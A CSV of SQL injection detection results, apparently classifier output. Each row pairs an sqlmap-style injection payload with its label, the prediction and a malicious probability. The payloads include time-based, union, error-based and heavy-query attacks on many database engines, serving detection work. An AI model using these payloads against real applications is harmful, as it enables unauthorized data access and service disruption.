Query,Label,predicted,correct,malicious_probability
waitfor delay '0:0:5' and    (    (     (  '%'  =  ',1,1,True,0.931787003065267
"-8777""  )   as lalf where 8606  =  8606 or elt  (  4397  =  5823,5823  )  --",1,1,True,0.782999249496896
"1""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,True,0.8212352220890242
"1   )    )    as huxq where 7451  =  7451 union all select null,null,null--",1,1,True,0.8187825818972967
"-9531'   )    )     )   union all select 4076,4076#",1,1,True,0.7244224147270849
"-8924   )    )    as jybr where 7901  =  7901 or elt  (  1032  =  1032,3623  )  --",1,1,True,0.8932018397977753
"1""  )   union all select null,null,null,null#",1,1,True,0.5742323331534287
"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""uqor"" like ""uqor",1,1,True,0.723368135397486
select   (  case when   (  9667  =  6212  )   then 9667 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,1,True,0.8142759744479157
"-5379'  )   union all select 4294,4294,4294--",1,1,True,0.7899760812257626
"1  )   where 6990  =  6990 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,True,0.8565133932432552
1  )   as kaew where 2658  =  2658,1,1,True,0.7606849734771249
-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,1,1,True,0.7673456170755216
"1' in boolean mode  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  #",1,1,True,0.7563476296647673
1'||  (  select 'miew' where 8360  =  8360 waitfor delay '0:0:5'  )  ||',1,1,True,0.9363522717385433
"-5672%"" or 3825  =  9675--",1,1,True,0.8396488684645171
1' where 2547  =  2547 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,1,True,0.9780142963870121
select sleep  (  5  )   and    (    (   '%'  =  ',1,1,True,0.8839240116367004
select   (  case when   (  3537  =  5218  )   then 3537 else 3537*  (  select 3537 from mysql.db  )   end  )  #,1,1,True,0.6076502419200873
1 and 5934  =  7745,1,1,True,0.7374627157643207
-4960'  )   union all select 5300--,1,1,True,0.9231374403870668
1'   )    )    or sleep  (  5  )  #,1,1,True,0.9686277933847294
"1 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,True,0.9575391364874597
1  )   or sleep  (  5  ) ,1,1,True,0.9264515601567958
"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""tfrs""  =  ""tfrs",1,1,True,0.8234519933773874
"1%'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  '",1,1,True,0.7481105443631673
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'fnjm'  =  'fnjm",1,1,True,0.7855073309609061
"-5622"" where 7970  =  7970 union all select 7970,7970,7970,7970,7970--",1,1,True,0.8119626197027928
"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kird'  =  'kird",1,1,True,0.8327739848675979
"1  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  4976  =  4976",1,1,True,0.6099284385002504
"-1263""  )   or 9323  =  9323#",1,1,True,0.5519166120621054
select   (  case when   (  9318  =  7198  )   then 9318 else 9318*  (  select 9318 from information_schema.character_sets  )   end  )  #,1,1,True,0.8573362066142698
1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,1,1,True,0.9421582009558425
1 where 7224  =  7224 and sleep  (  5  )  #,1,1,True,0.9140999543133602
-1985   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  1248  =  1248,1,1,True,0.6988614626246946
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'mabd'  =  'mabd,1,1,True,0.8872817277715507
1'   )    )    as xpmy where 5274  =  5274 rlike   (  select   (  case when   (  6252  =  7704  )   then 1 else 0x28 end   )    )   --,1,1,True,0.9044392303862467
1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'nuis'  =  'nuis,1,1,True,0.7864170110114969
1  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1,1,True,0.7764600538306472
"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",1,1,True,0.7276359405138273
"1""  )   where 6311  =  6311",1,1,True,0.7618828135813018
"-7423 or make_set  (  9354  =  9354,7185  )  -- hprc",1,1,True,0.963786473031252
1'+  (  select taga where 8036  =  8036,1,1,True,0.6754658635781953
"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,1,1,True,0.7853858352375614
"1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'jicq' like 'jicq",1,1,True,0.9128668920392717
 (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  5877  =  5877  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ,1,1,True,0.6995117886575823
"-1351"" where 6968  =  6968 or 5684  =  8582",1,1,True,0.6624592559259457
"-1030"" where 2161  =  2161 union all select 2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--",1,1,True,0.9168130656418584
"-4764""   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""dfvz"" like ""dfvz",1,1,True,0.7270821382634294
"1 where 1776  =  1776 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,True,0.9402278375004264
"1 where 3799  =  3799 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,True,0.9359181530024261
"-9672'   )    )    as rupb where 8218  =  8218 or make_set  (  4954  =  1836,1836  )  --",1,1,True,0.8169074462016919
"1%"" and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,True,0.9451880692841884
1'||  (  select 'cfff' where 4994  =  4994,1,1,True,0.7732547988455047
1'+  (  select 'jtvq' where 8288  =  8288 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,1,True,0.8448626445540346
1'+  (  select 'leok' where 4320  =  4320,1,1,True,0.7791443427664559
"1'+  (  select 'uijv' where 7279  =  7279 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1,True,0.887959103823293
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  1473  =  1473",1,1,True,0.5373066133568292
1%'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  '%'  =  ',1,1,True,0.7420939878786691
"-5579%""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,1,1,True,0.7200140164257471
1  )   where 2734  =  2734 waitfor delay '0:0:5'--,1,1,True,0.973055944347656
1'||  (  select 'qgnz' where 6446  =  6446,1,1,True,0.7892347015453671
1'   )    )    as nhkp where 8030  =  8030,1,1,True,0.8536795786501417
"1%""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""%""  =  """,1,1,True,0.7839625039672692
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and '%'  =  '",1,1,True,0.8952861858254926
1   )    )    as gygm where 4024  =  4024,1,1,True,0.714776937348575
"-2448%""  )   or 3038  =  3038",1,1,True,0.5335668163959801
"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'xzcr'  =  'xzcr",1,1,True,0.9582027681566113
1'+  (  select ijoh where 7145  =  7145 order by 1--,1,1,True,0.8940491422818299
1   )    )    as sipp where 1999  =  1999 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1,1,True,0.8957275862794329
"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""ikaf"" like ""ikaf",1,1,True,0.8753434269815671
if  (  1087  =  5839  )   select 1087 else drop function zzeh--,1,1,True,0.7016942600632674
-8753  )   order by 1#,1,1,True,0.8029751244805302
"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz",1,1,True,0.9196473181853878
"-1485'   )    )     )   union all select 7661,7661,7661,7661,7661--",1,1,True,0.8675942886171455
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  ""%""  =  """,1,1,True,0.8673846853385057
1  )   as jqbp where 5407  =  5407 and 4595  =  4595#,1,1,True,0.7541188049658563
"select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   from dual--",1,1,True,0.8323572613725714
"1%'  )   union all select null,null,null,null,null,null,null,null,null#",1,1,True,0.6318878901415123
1'+  (  select wpai where 3685  =  3685,1,1,True,0.6895222555154958
-6165%'   )    )    union all select 5384#,1,1,True,0.6512928490941561
1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,1,1,True,0.8953174725177643
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1,1,True,0.8731510926518172
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'frpo' like 'frpo",1,1,True,0.8646506515060383
"1""  )   where 2656  =  2656 or sleep  (  5  )  --",1,1,True,0.9447991472608475
-7786'   )    )    or 9323  =  9323#,1,1,True,0.62784579727356
"1'||  (  select 'gwxc' from dual where 3626  =  3626 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,True,0.9321709972915307
-5534 or 1983  =  5721#,1,1,True,0.7950828682091259
1'   )    )    as grne where 9003  =  9003 order by 1--,1,1,True,0.9464197807355965
"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""wrbs"" like ""wrbs",1,1,True,0.9135721422230778
"1""   )    )    as hkrh where 3060  =  3060 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,True,0.9485769284091669
"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'rqyz'  =  'rqyz",1,1,True,0.9365671479735193
"-5439"" or 2559  =  4692 and ""dcrf"" like ""dcrf",1,1,True,0.6415319668257943
"1""  )   as kndn where 9314  =  9314",1,1,True,0.747863530013052
-6030%'  )   or 3038  =  3038,1,1,True,0.6330673749729964
"1   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1,1,True,0.9362426732728616
"1 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # tqmr",1,1,True,0.9233036985069369
1   )    )    as tnhy where 1874  =  1874 and 2858  =  7324#,1,1,True,0.7095043709381179
-1910' or 2624  =  3371 and 'umoy'  =  'umoy,1,1,True,0.7826052910408161
-7293'   )    )     )   or 3038  =  3038,1,1,True,0.6177995332586644
"select sleep  (  5  )   and   (  ""%""  =  """,1,1,True,0.8538296719607311
"1 where 3410  =  3410 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,True,0.7566717042061116
"1'   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,True,0.9643893369136428
"1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  6786  =  6786",1,1,True,0.8913212305268793
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3#",1,1,True,0.9256183687058887
"1%""   )    )    union all select null,null,null,null,null,null,null,null,null#",1,1,True,0.5879962242523548
"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1,True,0.8777422417152339
"1""   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  ""hxgu""  =  ""hxgu",1,1,True,0.8307734303476929
1'  )   as twny where 9580  =  9580,1,1,True,0.8780769823738129
"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",1,1,True,0.5800331654218244
"1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'bvdw'  =  'bvdw",1,1,True,0.9513946429291277
"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1,1,True,0.7040714438774089
"-3884"" where 8012  =  8012 union all select 8012,8012#",1,1,True,0.6073452227512199
"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""eiuc"" like ""eiuc",1,1,True,0.7888962571609011
select sleep  (  5  )   and    (    (   'srfc' like 'srfc,1,1,True,0.8749459539268756
1  )   waitfor delay '0:0:5' and   (  2993  =  2993,1,1,True,0.8986060050194168
"1""  )   where 1666  =  1666 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,True,0.8057430958722278
"1""   )    )   ",1,1,True,0.7363669944295214
"-5572""  )   union all select 8131,8131#",1,1,True,0.6712148961495906
"1 where 2823  =  2823 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,True,0.9107928036445138
1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,1,1,True,0.9689079768782247
-3026  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1,1,True,0.6958193440820551
"1%"" and elt  (  4249  =  4249,7259  )   and ""%""  =  """,1,1,True,0.630864517197027
1' where 2389  =  2389 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,1,True,0.8696688332342815
"1  )   where 6788  =  6788 union all select null,null,null,null,null,null,null,null,null--",1,1,True,0.7758234761471066
-2912'   )    )    order by 1--,1,1,True,0.9438654499503341
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3",1,1,True,0.8834849439035389
"1"" union all select null,null,null,null,null#",1,1,True,0.5822333427470698
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1,1,True,0.6623839285421973
select sleep  (  5  )  -- hlgt,1,1,True,0.9897889109431711
"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'sqnk'  =  'sqnk",1,1,True,0.8651826469475267
"1'   )    )    as ytfi where 3323  =  3323 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,True,0.9481374368028295
"-4091   )    )    as lqqy where 3030  =  3030 union all select 3030,3030,3030#",1,1,True,0.7231529061387243
"1',  (  select   (  case when   (  8596  =  8596  )   then 1 else 8596*  (  select 8596 from mysql.db  )   end   )    )   ",1,1,True,0.6789337799368886
1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'snoa'  =  'snoa,1,1,True,0.9345913001329755
"1"" where 9014  =  9014 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",1,1,True,0.9680231676846482
select case when 8227  =  1229 then 1 else null end--,1,1,True,0.8124913320193989
-8465' where 5242  =  5242 or 3806  =  7423--,1,1,True,0.8277037902817005
"-1949""   )    )    as urke where 8761  =  8761 union all select 8761,8761,8761,8761,8761,8761,8761#",1,1,True,0.7444931750694482
"1'   )    )    as uuuk where 7234  =  7234 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,1,True,0.8798295491077025
1'  )   as mqxb where 6496  =  6496 and 7533  =  7533--,1,1,True,0.9254426491354948
"1%' union all select null,null,null,null,null,null,null,null--",1,1,True,0.8328165859548372
1'  )   where 4298  =  4298,1,1,True,0.8275498358453331
"-5417 or elt  (  1032  =  1032,3623  )  ",1,1,True,0.7491231888413165
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",1,1,True,0.6903817281862649
"-9978"" or make_set  (  4893  =  9765,9765  )   and ""mhjt""  =  ""mhjt",1,1,True,0.5847386837133828
"-7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--",1,1,True,0.7433206834096389
"1'||  (  select 'iocs' where 9287  =  9287 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",1,1,True,0.8487250210606323
"1   )    )    as khvx where 7533  =  7533 union all select null,null,null,null,null,null,null,null--",1,1,True,0.8139663207784544
"1' in boolean mode  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,True,0.8774216274653778
"1""  )   as jtou where 8129  =  8129 and 7533  =  7533--",1,1,True,0.8548195899285274
1  )   where 6494  =  6494,1,1,True,0.7912061261560087
"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",1,1,True,0.8868495130403534
"1'+  (  select luwn where 1214  =  1214 union all select null,null,null,null,null,null#",1,1,True,0.6361573770594726
1%'   )    )     )   and 2006  =  2006,1,1,True,0.7322934292034007
"-7235""  )   union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",1,1,True,0.6582327755995847
"-3756'  )   union all select 1034,1034,1034--",1,1,True,0.7939619354041538
select sleep  (  5  )   and 'gajm'  =  'gajm,1,1,True,0.8852660806480505
"1""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""twpn"" like ""twpn",1,1,True,0.7220381389268191
"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""wdye"" like ""wdye",1,1,True,0.6900878187863391
"1',  (  select   (  case when   (  3902  =  3902  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",1,1,True,0.6932728327312748
-3956'  )   or   (  8459  =  8459  )  *4906 and   (  'rflo' like 'rflo,1,1,True,0.7026658327505713
"1,iif  (  1440  =  4612,1,1/0  )  ",1,1,True,0.904845563060837
1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'gegg'  =  'gegg,1,1,True,0.8062675682565605
"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,True,0.9192174259221786
"1""   )    )    as uzvu where 2458  =  2458 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,1,True,0.9168027910628164
"1%'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1,True,0.8845243454292337
"1 union all select null,null,null,null,null,null#",1,1,True,0.6349134374413233
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'wvzw'  =  'wvzw",1,1,True,0.8531767033943424
"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ",1,1,True,0.7899794039003669
1'+  (  select 'yjpp' where 8966  =  8966,1,1,True,0.7674723905492407
"1%""  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""%""  =  """,1,1,True,0.6848624422099492
"-8266%'  )   union all select 8626,8626,8626,8626,8626,8626--",1,1,True,0.7130506067216963
"1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,True,0.844786924928507
"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",1,1,True,0.8572107852932469
"-6359""   )    )    or elt  (  3546  =  2433,2433  )   and    (    (   ""qxat""  =  ""qxat",1,1,True,0.5614588122790976
"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",1,1,True,0.783968521538243
1   )    )     )   and 6358  =  6735,1,1,True,0.7306014308627242
1'   )    )    as cimd where 9608  =  9608,1,1,True,0.8439460917654217
"1'  )   as kgnd where 1550  =  1550 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,True,0.9629080654994047
1'+  (  select 'sbji' where 7989  =  7989 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',1,1,True,0.814923241721902
-9690 union all select 7217#,1,1,True,0.6513711187369308
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz",1,1,True,0.9285806087075106
"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'eomt'  =  'eomt",1,1,True,0.9136118557413205
